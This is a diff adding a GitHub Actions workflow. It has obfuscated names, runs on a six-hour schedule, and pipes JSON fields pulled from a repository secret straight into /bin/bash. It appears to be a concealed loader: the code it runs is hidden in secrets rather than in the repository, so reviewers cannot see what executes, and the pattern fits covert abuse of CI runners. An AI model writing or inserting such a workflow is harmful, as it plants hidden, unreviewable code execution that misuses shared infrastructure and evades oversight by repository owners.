@@ -1,0 +1,23 @@
+name: qiaowuhui5617
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiaowuhui5617
+        env:
+          ywvr33: ${{ secrets.ywvr33 }}
+        run: |
+          echo $ywvr33 | jq -r .jteqf73 | /bin/bash
+          echo $i63 | jq -r .vuup0 | /bin/bash
+          echo $ra157 | jq -r .bbdjm221 | /bin/bash
+          echo $ef679 | jq -r .z2 | /bin/bash
+          echo $vgd815 | jq -r .xyk37387 | /bin/bash
+          echo $alauk3593 | jq -r .z0 | /bin/bash
+
